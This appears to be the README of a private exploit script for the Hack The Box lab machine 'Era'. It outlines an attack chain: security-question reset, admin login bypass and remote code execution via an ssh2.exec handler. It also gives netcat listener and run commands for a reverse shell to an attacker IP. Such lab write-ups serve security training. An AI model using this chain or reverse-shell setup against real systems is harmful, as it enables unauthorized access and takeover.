# 🚫 PRIVATE PoC: RCE Exploit for HTB "Era" (Active Machine)

> 🔒 **DO NOT PUBLISH OR DISTRIBUTE THIS FILE UNTIL THE MACHINE IS RETIRED FROM HACK THE BOX.**
>
> This exploit is strictly for educational and internal use while the machine is still active.

---

## 📌 Description

This Python script demonstrates a full exploitation chain for the *Era* machine on Hack The Box. It performs:

- User login as `yuri`
- Reset of the `admin` account’s security questions
- Login as `admin` via security bypass
- Enumeration of available file IDs
- File upload (if no files were found on server)
- Triggering **remote code execution** via a misused `ssh2.exec` handler
- Optional automatic listener launch via `nc`

---

## ⚠️ Prerequisites

- HTB VPN connected
- `http://file.era.htb` added to `/etc/hosts`:

- Python 3.7+
- Required tools:
- `curl` (only for testing)
- `nc` (`netcat`) for reverse shell
- `requests` module (should be pre-installed)

---

## 🛠️ Usage
`python3 era_rce.py <your-IP> <your-port>`

If you want to skip automatic listener:

start netcat `nc -lvnp 5050` 

execute code `python3 era_rce.py 10.10.14.60 5050 --no-listen`

<img width="1910" height="836" alt="1" src="https://github.com/user-attachments/assets/7677722e-23ff-4f53-999b-8b5d18150127" />

